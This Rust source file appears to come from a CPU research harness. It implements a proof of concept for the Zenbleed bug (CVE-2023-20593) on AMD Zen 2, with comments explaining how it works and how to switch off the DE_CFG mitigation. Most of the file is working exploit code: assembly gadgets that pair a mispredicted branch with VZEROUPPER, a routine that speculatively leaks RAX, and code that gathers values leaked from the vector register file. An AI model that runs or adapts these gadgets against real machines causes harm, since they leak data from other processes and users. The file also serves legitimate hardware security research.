use std::collections::*;
use rand::prelude::*;
use rand::distributions::{Distribution, Standard};

use itertools::*;

use perfect::stats::*;
use perfect::*;
use perfect::events::*;

fn main() {
    let mut harness = HarnessConfig::default_zen2()
        .dump_vgpr(true)
        .zero_strategy_fp(ZeroStrategyFp::Vzeroall)
        .emit();
    Zenbleed::run(&mut harness);
}


/// Demonstrate conditions for the Zenbleed bug (CVE-2023-20593). 
///
/// Setup
/// =====
///
/// This will [obviously] not work if you have the appropriate microcode.
/// Versions with the patch are documented in `arch/x86/kernel/cpu/amd.c`.
///
/// Even without a microcode patch, either BIOS or the Linux kernel will set 
/// DE_CFG[9] (which disables floating-point move elimination) on all cores 
/// as a mitigation. You'll need to clear this if you want to actually run 
/// experiments (see `./scripts/decfg.sh`).
///
/// To avoid any additional noise, you might also want to:
///
/// - Disable SMT
/// - Boot Linux with 'isolcpus=' and 'nohz_full='
/// - Avoid using other applications in the background
///
/// ... but in any case, the exact behavior is *extremely sensitive* to the 
/// state of the FP/vector pipeline, and running this from Linux userspace 
/// is probably not ideal. 
///
/// Explanation
/// ===========
/// 
/// See <https://reflexive.space/zenbleed/> for my extended discussion on this. 
/// As far as I can tell, the conditions for triggering the bug are:
///
/// 1. The entry for some vector register 'SRC_YMM' must have its Z-bit set
///    in the register map. This may occur at any time before the move 
///    instruction, and may also occur within the same dispatch window before 
///    the move instruction.
///
/// 2. Create a situation where the following ops share the same dispatch
///    window: 
///
///    - The first and second ops can be FNOP
///    - The third op must be a move operation from 'SRC_YMM' to 'TGT_YMM'
///    - The fourth op must be a mispredicted branch 
///    - The fifth op must be VZEROUPPER
///
/// 3. After recovering from the mispredicted branch, we expect the value in 
///    the upper-half of TGT_YMM to be zero, but we instead find an undefined
///    stale value from somewhere else in the vector PRF.
///
///
/// Branch Misprediction
/// ====================
///
/// In this case, we're using an indirect branch and relying on straight-line 
/// speculation (SLS) past the branch. You can also do this with direct 
/// conditional branches. 
///
/// SLS over direct branches does not appear to work; as far as I can tell,  
/// this is either because (a) the speculative window is not long enough for 
/// VZEROUPPER to actually complete, or (b) there's some other conditions 
/// that I don't understand. 
///
/// AFAICT you cannot perform this over a return instruction, but I admittedly
/// didn't try very hard when testing it. 
///
/// Test
/// ====
///
/// 1. Flush the BTB in an attempt to consistently cause SLS. 
/// 2. Pollute the PRF with our own "probe" values.
/// 3. Run the gadget some number of times and dump the vector registers.
/// 4. Check the register dumps for our probe values. 
///
///
pub struct Zenbleed;
impl Zenbleed {
    /// The source YMM register whose zero bit will be set.
    const SRC_YMM: VectorGpr = VectorGpr::YMM2;
    /// The target YMM register whose upper-half will contain a leaked value.
    const TGT_YMM: VectorGpr = VectorGpr::YMM3;
    /// The number of allocated probe values. 
    const NUM_PROBES: usize = (1 << 10); 

    /// Emit the test. 
    fn emit() -> X64Assembler {
        let mut f = X64Assembler::new().unwrap();

        // Pollute the physical register file with values that will leaked
        //Self::emit_leak_probe_1(&mut f, 0);
        Self::emit_leak_spec_rax(&mut f, 32, |f| {
            dynasm!(f
                //; xor rbx, rbx
                //; mov rbx, rax
                //; mov [rsp+16], rbx
                //; mov rax, [rsp+16]
                //; stac
                //; mov ecx, 1
                //; mov rbx, QWORD 0x0100_0000_0000_0000
                //; .bytes [0x0f, 0x01, 0xfd]
                //; or rax, rbx
                ; rdfsbase rax

            );
        });
        //Self::emit_probe_setup_1(&mut f, 0);
        //Self::emit_probe_setup_1(&mut f, 1);
        //Self::emit_probe_setup_1(&mut f, 2);

        // Flush the BTB with unconditional always-taken branches
        for _ in 0..0x4000 { dynasm!(f ; jmp >next ; next:); }

        f.emit_rdpmc_start(0, Gpr::R15 as u8);

        // Pick your poison
        Self::emit_gadget_sls_indirect(&mut f);
        //Self::emit_gadget_sls_direct(&mut f);
        //Self::emit_gadget_conditional_direct(&mut f);

        f.emit_rdpmc_end(0, Gpr::R15 as u8, Gpr::Rax as u8);
        f.emit_ret();
        f.commit().unwrap();
        f
    }

    /// Run the test. 
    fn run(harness: &mut PerfectHarness) {
        //let event = Zen2Event::ExRetBrnIndMisp(0x00);

        // NOTE: We expect to see count FP ops when VZEROUPPER is dispatched
        // (indicating that we actually mispredicted the branch). 
        let event = Zen2Event::DeDisOpsFromDecoder(DeDisOpsFromDecoderMask::Fp);

        // Emit the test
        let asm = Self::emit();
        let asm_reader = asm.reader();
        let asm_tgt_buf = asm_reader.lock();
        let asm_tgt_ptr = asm_tgt_buf.ptr(AssemblyOffset(0));
        let asm_fn: MeasuredFn = unsafe { 
            std::mem::transmute(asm_tgt_ptr)
        };

        //disas(&asm_tgt_buf, AssemblyOffset(0));

        // Take some measurements
        let desc = event.as_desc();
        let results = harness.measure(asm_fn, 
            desc.id(), desc.mask(), 16384, InputMethod::Fixed(0, 0)
        ).unwrap();

        let min = results.get_min();
        let max = results.get_max();
        let dist = results.get_distribution();
        println!("    {:03x}:{:02x} {:032} min={} max={} dist={:?}",
            desc.id(), desc.mask(), desc.name(), min, max, dist);


        // For each of the test iterations, check the state of the vector 
        // registers that we saved after the test. If a leaked probe appeared
        // in the upper-half of TGT_YMM, collect it in a hashmap.
        let mut probe_map = HashMap::new();
        let mut nonprobe_map = HashMap::new();
        if let Some(vgpr_dumps) = results.vgpr_dumps {
            for dump in &vgpr_dumps {
                let src = dump.read_vgpr(Self::SRC_YMM);
                let tgt = dump.read_vgpr(Self::TGT_YMM);

                // If this is a leaked probe
                if let Some(probe) = ProbeValue::from_u64(tgt[2]) {
                    if let Some(cnt) = probe_map.get_mut(&probe) {
                        *cnt += 1; 
                    } else { 
                        probe_map.insert(probe, 1);
                    }
                } 
                // If this is some other leaked value
                else if tgt[2] != 0 {
                    let val = LeakedValue(tgt[2] as usize);
                    if let Some(cnt) = nonprobe_map.get_mut(&val) {
                        *cnt += 1;
                    } else {
                        nonprobe_map.insert(val, 1);
                    }
                }
            }
        }

        let probe_map_iter = probe_map.iter().sorted_by(|x, y| {
            let order_reg = x.0.arch_reg().partial_cmp(&y.0.arch_reg()).unwrap();
            let order_index = x.0.index().partial_cmp(&y.0.index()).unwrap();
            order_index
        });
        if probe_map.len() == 0 {
            println!("[!] No probes collected?");
        } else {
            println!("[*] Observed probes:");
            for (probe, cnt) in probe_map_iter {
                println!("  {:016x?}: reg={:<2} idx={:<5} cnt={:<5}", 
                    probe, probe.arch_reg(), probe.index(), cnt
                );
            }
        }
        if nonprobe_map.len() == 0 {
            println!("[!] No leaked values collected?");
        } else {
            println!("[*] Observed leaked values:");
            for (val, cnt) in nonprobe_map.iter() {
                println!("  {:016x?}: cnt={:<5}", val, cnt);
            }
        }


    }
}

/// These are various strategies for preparing values that we expect to be 
/// leaked with the gadget. 
impl Zenbleed {

    /// Fill the vector PRF with probe values. 
    ///
    /// Notes
    /// =====
    ///
    /// These notes are from experiments with the following parameters: 
    /// - No SMT, booting with 'isolcpus=...', etc.
    /// - 1024 probe allocations, all with YMM0
    ///
    /// This leaks probe #27 very consistently, but don't ask me why.
    ///
    /// The choice of SRC_YMM and TGT_YMM doesn't appear to make a difference, 
    /// and the choice of architectural register while allocating probes 
    /// doesn't seem to make a difference either. 
    ///
    /// Removing either or both of the initial VZEROALL and LFENCE changes
    /// the behavior, but it's unclear exactly *how* or *why*. 
    /// The distribution of probes doesn't seem reproducible enough to draw 
    /// any conclusions.
    ///
    fn emit_leak_probe_1(f: &mut X64Assembler, probe_reg: usize) {
        dynasm!(f
            ; vzeroall
            ; lfence
        );

        for alloc_idx in (0..Self::NUM_PROBES) {
            let probe_value = ProbeValue::new(probe_reg, alloc_idx);
            dynasm!(f
                ; mov rax, QWORD probe_value.as_i64()
                ; vmovq Rx(probe_reg as u8), rax
                ; vpbroadcastq Ry(probe_reg as u8), Rx(probe_reg as u8)
            );
        }
    }

    /// Speculatively leak RAX into the vector PRF. 
    ///
    /// > *This place is not a place of honor.* \
    /// > *No highly esteemed deed is commemorated here.* \
    /// > *What is here was dangerous and repulsive to us.* \
    /// > *This message is a warning about danger.* \
    /// > [...]
    ///
    /// This lets you perform speculative computations, and then uses the 
    /// bug to make the result architecturally visible (albeit indirectly
    /// and somewhat unreliably). Good luck. 
    ///
    fn emit_leak_spec_rax(
        f: &mut X64Assembler, 
        iters: usize,
        user_fn: fn(&mut X64Assembler),
    ) 
    {
        let myfunc = f.new_dynamic_label();
        let regid = 4;
        dynasm!(f
            ; mov rax, 0
            ; mov rcx, iters as i32
            ; vpxor Ry(regid), Ry(regid), Ry(regid)
            ; vpxor Ry(regid), Ry(regid), Ry(regid)

            ; .align 64
            ; ->top:

            ; .align 64
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; lfence
            ; call =>myfunc
        );

        // The user-provided function will be speculatively executed.
        // This expects that you're going to leak whatever ends up in RAX.
        user_fn(f);
        for _ in 0..8 {
            dynasm!(f
                ; vmovq Rx(regid), rax
                //; vpinsrq Rx(regid), Rx(regid), rax, 9
                ; vpbroadcastq Ry(regid), Rx(regid)
            );
        }

        f.emit_nop_sled(4096);
        f.emit_lfence();
        dynasm!(f
            ; .align 64
            ; =>myfunc
            ; lea r13, [->setup_done]
            ; movnti [rsp], r13
            ; ret

            ; .align 64
            ; ->setup_done:
            ; dec rcx
            ; cmp rax, 0
            ; cmp rcx, 0
            ; jne ->top
        );
    }
}

/// These are emitters for the gadget with different strategies for causing 
/// the branch misprediction. 
impl Zenbleed {
    fn emit_gadget_sls_indirect(f: &mut X64Assembler) {
        dynasm!(f
            // Architectural target for the mispredicted indirect jump
            ; lea r14, [->done]

            // Clear the upper-half of SRC_YMM. 
            // The choice of instruction here is arbitrary, so long as you're
            // clearing the upper-half of the destination register. 
            ; vpaddq Rx(Self::SRC_YMM as u8), xmm0, xmm0

            // Some padding to place the gadget on a 64-byte boundary.
            // Not strictly necessary, but nice gesture to the frontend. 
            ; .align 64
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP5
            ; lfence

            // Gadget to leak some value in the upper-half of TGT_YMM. 
            ; ->zenbleed_gadget:
            ; fnop
            ; fnop
            ; vmovdqu Ry(Self::TGT_YMM as u8), Ry(Self::SRC_YMM as u8)
            ; jmp r14
            ; vzeroupper

            ; .align 64
            ; ->done:
        );
    }

    fn emit_gadget_sls_direct(f: &mut X64Assembler) {
        dynasm!(f
            ; vpaddq Rx(Self::SRC_YMM as u8), xmm0, xmm0

            ; .align 64
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP5
            ; lfence

            ; ->zenbleed_gadget:
            ; fnop
            ; fnop
            ; vmovdqu Ry(Self::TGT_YMM as u8), Ry(Self::SRC_YMM as u8)
            ; jmp ->done
            ; vzeroupper

            ; .align 64
            ; ->done:
        );
    }



    fn emit_gadget_conditional_direct(f: &mut X64Assembler) {
        dynasm!(f
            ; mov rax, 0
            ; cmp rax, 0
            ; vpaddq Rx(Self::SRC_YMM as u8), xmm0, xmm0

            ; .align 64
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP8
            ; .bytes NOP5
            ; lfence

            ; fnop
            ; fnop
            ; vmovdqu Ry(Self::TGT_YMM as u8), Ry(Self::SRC_YMM as u8)
            ; jz ->done
            ; vzeroupper

            ; .align 64
            ; ->done:
        );
    }
}


/// Type for tracking leaked values. 
///
/// Each probe contains the following information: 
///
/// - Magic bits (`0x0000_dead_0000_0000`) in order to distinguish probes
///   from other values in the PRF
///
/// - 4 bits (`0x0000_0000_f000_0000`) for the architectural register number
///   that was used to allocate the probe
///
/// - 28 bits (`0x0000_0000_0fff_ffff`) for an index unique to each physical
///   register allocation we might make
///
#[repr(transparent)]
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub struct ProbeValue(pub usize);
impl ProbeValue {
    /// Mask for the magic bits
    const ID_MASK: usize       = 0xffff_0000_0000_0000;
    /// Magic bits
    const ID_BITS: usize       = 0x1337_0000_0000_0000;
    /// Mask for the architectural register bits
    const ARCH_REG_MASK: usize = 0x0000_f000_0000_0000;
    /// Mask for the index bits
    const INDEX_MASK: usize    = 0x0000_0000_0fff_ffff;

    /// Return the architectural register number for this probe
    pub fn arch_reg(&self) -> usize { 
        (self.0 & Self::ARCH_REG_MASK) >> 44 
    }

    /// Return the index number of this probe
    pub fn index(&self) -> usize { 
        self.0 & Self::INDEX_MASK
    }

    /// Returns 'true' if this is a valid probe
    pub fn is_valid(&self) -> bool {
        (self.0 & Self::ID_MASK) == Self::ID_BITS
    }

    /// Synthesize a new probe from an architectural register number and an 
    /// index number. 
    pub fn new(reg_idx: usize, alloc_idx: usize) -> Self { 
        let arch_reg_bits = (reg_idx << 44) & Self::ARCH_REG_MASK;
        Self(Self::ID_BITS | arch_reg_bits | alloc_idx)
    }

    /// Try to create a new [ProbeValue] from an arbitrary [u64]. 
    /// Returns [Option::None] if the value is not a valid probe. 
    pub fn from_u64(value: u64) -> Option<Self> { 
        let res = Self(value as usize);
        if res.is_valid() { Some(res) } else { None }
    }

    /// Return the [i64] representation of this probe.
    pub fn as_i64(&self) -> i64 { 
        self.0 as i64
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub struct LeakedValue(pub usize);

